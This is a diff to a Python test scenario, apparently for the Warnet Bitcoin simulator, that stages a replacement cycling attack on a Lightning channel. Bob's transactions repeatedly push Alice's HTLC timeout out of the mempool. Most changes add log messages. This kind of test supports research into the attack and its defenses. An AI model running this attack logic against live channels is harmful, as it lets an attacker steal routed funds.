@@ -6,10 +6,9 @@
 # https://github.com/ariard/bitcoin/blob/30f5d5b270e4ff195e8dcb9ef6b7ddcc5f6a1bf2/test/functional/mempool_replacement_cycling.py#L5
 
 
-def cli_help():
-    return "Run a replacement cycling attack"
-
 """Test replacement cyling attacks against Lightning channels"""
+import threading
+import queue
 
 from test_framework.key import (
         ECKey
@@ -58,6 +57,11 @@ from test_framework.script import (
 from warnet.test_framework_bridge import WarnetTestFramework
 
 from test_framework.wallet import MiniWallet
+from anticycle import run_anticycle
+
+
+def cli_help():
+    return "Run a replacement cycling attack"
 
 def get_funding_redeemscript(funder_pubkey, fundee_pubkey):
     return CScript([OP_2, funder_pubkey.get_bytes(), fundee_pubkey.get_bytes(), OP_2, OP_CHECKMULTISIG])
@@ -223,6 +227,8 @@ class ReplacementCyclingTest(WarnetTestFramework):
         # Generate funding transaction opening channel between Alice and Bob.
         ab_funding_tx = generate_funding_chan(wallet, coin_1, alice_seckey.get_pubkey(), bob_seckey.get_pubkey())
 
+        alice.log.info(f"A & B sign Funding Txn: Alice/Bob 2/2 multisig")
+
         # Propagate and confirm funding transaction.
         ab_funding_txid = alice.sendrawtransaction(hexstring=ab_funding_tx.serialize().hex(), maxfeerate=0)
 
@@ -240,6 +246,8 @@ class ReplacementCyclingTest(WarnetTestFramework):
         block = alice.getblock(lastblockhash)
         lastblockheight = block['height']
 
+        self.log.info(f"Alice sent funding Txn, included @ {lastblockheight}")
+
         hashlock = hash160(b'a' * 32)
 
         funding_redeemscript = get_funding_redeemscript(alice_seckey.get_pubkey(), bob_seckey.get_pubkey())
@@ -251,7 +259,23 @@ class ReplacementCyclingTest(WarnetTestFramework):
 
         (bob_parent_tx, bob_child_tx) = generate_parent_child_tx(wallet, coin_2, parent_seckey.get_pubkey(), 1)
 
-        (ab_commitment_tx, alice_timeout_tx, bob_preimage_tx) = create_chan_state(ab_funding_txid, 0, alice_seckey, bob_seckey, 49.99998 * COIN, funding_redeemscript, 2, lastblockheight + 20, hashlock, 0x1, bob_parent_tx)
+        self.log.info("Bob makes the Parent Txn & Child Txn using Coin_2.")
+
+        (ab_commitment_tx, alice_timeout_tx, bob_preimage_tx) = create_chan_state(ab_funding_txid,
+                                                                                  0,
+                                                                                  alice_seckey,
+                                                                                  bob_seckey,
+                                                                                  49.99998 * COIN,
+                                                                                  funding_redeemscript,
+                                                                                  2,
+                                                                                  lastblockheight + 20,
+                                                                                  hashlock,
+                                                                                  0x1,
+                                                                                  bob_parent_tx)
+
+        self.log.info("Funding Txn output -> A & B sign the Commitment Txn: Alice can claim w/ 2/2 multisig; Bob can claim with hashlock")
+        self.log.info("Commitment Txn output -> A & B sign the Timeout Txn: After nLockTime, Alice claims with 2/2 multisig")
+        self.log.info("Commitment Txn output -> Bob signs the Preimage Txn: Bob claims Commitment Txn w/ preimage + the Parent Txn")
 
         # We broadcast Alice - Bob commitment transaction.
         ab_commitment_txid = alice.sendrawtransaction(hexstring=ab_commitment_tx.serialize().hex(), maxfeerate=0)
@@ -267,9 +291,17 @@ class ReplacementCyclingTest(WarnetTestFramework):
         assert_equal(len(alice.getrawmempool()), 0)
         assert_equal(len(bob.getrawmempool()), 0)
 
+        lastblockhash = alice.getbestblockhash()
+        block = alice.getblock(lastblockhash)
+        blockheight_print = block['height']
+
+        self.log.info(f"Alice broadcasted the Commitment Txn & mined 20 blocks; now @ {blockheight_print}")
+
         # Broadcast the Bob parent transaction and its child transaction
         bob_parent_txid = bob.sendrawtransaction(hexstring=bob_parent_tx.serialize().hex(), maxfeerate=0)
         bob_child_txid = bob.sendrawtransaction(hexstring=bob_child_tx.serialize().hex(), maxfeerate=0)
+
+        self.log.info(f"Bob broadcasted the Parent Txn & Child Txn @ {blockheight_print}")
 
         self.sync_all()
 
@@ -282,7 +314,7 @@ class ReplacementCyclingTest(WarnetTestFramework):
         block = alice.getblock(lastblockhash)
         blockheight_print = block['height']
 
-        self.log.info("Alice broadcasts her HTLC timeout transaction at block height {}".format(blockheight_print))
+        self.log.info("Alice broadcasts her Timeout Txn @ {}".format(blockheight_print))
 
         # Broadcast the Alice timeout transaction
         alice_timeout_txid = alice.sendrawtransaction(hexstring=alice_timeout_tx.serialize().hex(), maxfeerate=0)
@@ -300,7 +332,7 @@ class ReplacementCyclingTest(WarnetTestFramework):
         assert bob_preimage_txid in alice.getrawmempool()
         assert bob_preimage_txid in bob.getrawmempool()
 
-        self.log.info("Bob broadcasts his HTLC preimage transaction at block height {} to replace".format(blockheight_print))
+        self.log.info("Bob broadcasted his Preimage Txn to replace Alice's Timeout Txn @ {}".format(blockheight_print))
 
         # Check Alice timeout transaction and Bob child tx are not in the mempools anymore
         assert not alice_timeout_txid in alice.getrawmempool()
@@ -308,10 +340,14 @@ class ReplacementCyclingTest(WarnetTestFramework):
         assert not bob_child_txid in alice.getrawmempool()
         assert not bob_child_txid in bob.getrawmempool()
 
+        self.log.info(f"Alice's Timeout Txn and Bob's Child Txn are not in mempool @ {blockheight_print}")
+
         # Generate a higher fee parent transaction and broadcast it to replace Bob preimage tx
         (bob_replacement_parent_tx, bob_child_tx) = generate_parent_child_tx(wallet, coin_2, parent_seckey.get_pubkey(), 10)
 
         bob_replacement_parent_txid = bob.sendrawtransaction(hexstring=bob_replacement_parent_tx.serialize().hex(), maxfeerate=0)
+
+        self.log.info(f"Bob makes Replacement Parent Txn (w/ higher fee) and broadcasts it @ {blockheight_print}")
 
         self.sync_all()
 
@@ -325,10 +361,19 @@ class ReplacementCyclingTest(WarnetTestFramework):
         assert_equal(len(alice.getrawmempool()), 1)
         assert_equal(len(bob.getrawmempool()), 1)
 
+        self.log.info(f"Bob's Preimage Txn not in mempool @ {blockheight_print}")
+        self.log.info(f"Bob's Replacement Parent Txn is in mempool @ {blockheight_print}")
+
         # A block is mined and bob replacement parent should have confirms.
         self.generate(alice, 1)
+        lastblockhash = alice.getbestblockhash()
+        block = alice.getblock(lastblockhash)
+        blockheight_print = block['height']
+
         assert_equal(len(alice.getrawmempool()), 0)
         assert_equal(len(bob.getrawmempool()), 0)
+
+        self.log.info(f"Mined Bob's Replacement Parent Txn @ {blockheight_print}")
 
         # Alice can re-broadcast her HTLC-timeout as the offered output has not been claimed
         # Note the HTLC-timeout _txid_ must be modified to bypass p2p filters. Here we +1 the nSequence.
@@ -341,7 +386,8 @@ class ReplacementCyclingTest(WarnetTestFramework):
         block = alice.getblock(lastblockhash)
         blockheight_print = block['height']
 
-        self.log.info("Alice re-broadcasts her HTLC timeout transaction at block height {}".format(blockheight_print))
+        self.log.info(
+            f"Alice tweaks nSequence & re-broadcasts Timeout txn (output has not been claimed yet) @ {blockheight_print}")
 
         assert alice_timeout_txid_2 in alice.getrawmempool()
         assert alice_timeout_txid_2 in bob.getrawmempool()
@@ -351,24 +397,36 @@ class ReplacementCyclingTest(WarnetTestFramework):
         (bob_parent_tx_2, bob_child_tx_2) = generate_parent_child_tx(wallet, coin_3, parent_seckey.get_pubkey(), 4)
         bob_preimage_tx_2 = generate_preimage_tx(49.9998 * COIN, 4, alice_seckey, bob_seckey, hashlock, ab_commitment_tx, bob_parent_tx_2)
 
+        self.log.info(
+            f"Bob re-makes a Parent Txn & Child Txn (Coin_3) and a new Preimage Txn (spends Parent Txn) @ {blockheight_print}")
+
         bob_parent_txid_2 = bob.sendrawtransaction(hexstring=bob_parent_tx_2.serialize().hex(), maxfeerate=0)
 
         self.sync_all()
+
+        self.log.info(
+            f"Bob broadcasts Parent Txn @ {blockheight_print}")
 
         bob_child_txid_2 = bob.sendrawtransaction(hexstring=bob_child_tx_2.serialize().hex(), maxfeerate=0)
 
         self.sync_all()
 
+        self.log.info(
+            f"Bob broadcasts Child Txn @ {blockheight_print}")
+
         bob_preimage_txid_2 = bob.sendrawtransaction(hexstring=bob_preimage_tx_2.serialize().hex(), maxfeerate=0)
 
         self.sync_all()
+
+        self.log.info(
+            f"Bob broadcasts Preimage Txn @ {blockheight_print}")
 
         assert bob_preimage_txid_2 in alice.getrawmempool()
         assert bob_preimage_txid_2 in bob.getrawmempool()
         assert not alice_timeout_txid_2 in alice.getrawmempool()
         assert not alice_timeout_txid_2 in bob.getrawmempool()
 
-        self.log.info("Bob re-broadcasts his HTLC preimage transaction at block height {} to replace".format(blockheight_print))
+        self.log.info(f"Bob's Preimage Txn is in the mempool; Alice's Timeout Txn is not @ {blockheight_print}")
 
         # Bob can repeat this replacement cycling trick until an inbound HTLC of Alice expires and double-spend her routed HTLCs.
 
@@ -379,6 +437,7 @@ class ReplacementCyclingTest(WarnetTestFramework):
         self.wallet = MiniWallet(self.nodes[0])
 
         self.test_replacement_cycling()
+
 
 if __name__ == '__main__':
     ReplacementCyclingTest().main()
